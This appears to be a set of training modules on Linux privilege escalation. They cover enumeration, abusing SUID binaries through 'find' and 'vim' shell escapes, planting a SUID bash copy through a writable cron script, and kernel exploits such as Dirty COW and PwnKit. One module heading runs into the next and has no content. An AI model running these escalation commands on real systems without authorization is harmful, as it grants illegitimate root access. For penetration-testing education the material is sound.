modules.title: Privilege Escalation Overview
modules.content:
## Linux Privilege Escalation

### Goal
Escalate from low-privilege user to root.

### Enumeration First
```bash
id
whoami
uname -a
cat /etc/issue
```

### Common Vectors
- SUID binaries
- Sudo misconfigurations
- Cron jobs
- Kernel exploits
- Writable files

modules.title: SUID/SGID Exploitation
modules.content:
## SUID Binaries

Files that run with owner privileges.

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check GTFOBins
# Example: find
find . -exec /bin/sh -p \;

# Example: vim
vim -c ':!/bin/sh'
```

modules.title: Sudo Misconfigurations
Cron Job Exploitation
modules.content:
## Cron Jobs

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Find writable scripts
find / -writable -type f 2>/dev/null
```

### Exploitation
```bash
# If script is writable
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# After cron runs
/tmp/bash -p
```

modules.title: Kernel Exploits
modules.content:
## Kernel Exploitation

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel 4.4
```

### Popular Exploits
- Dirty COW (CVE-2016-5195)
- PwnKit (CVE-2021-4034)

### Tools
- linux-exploit-suggester
- LinPEAS
- LinEnum
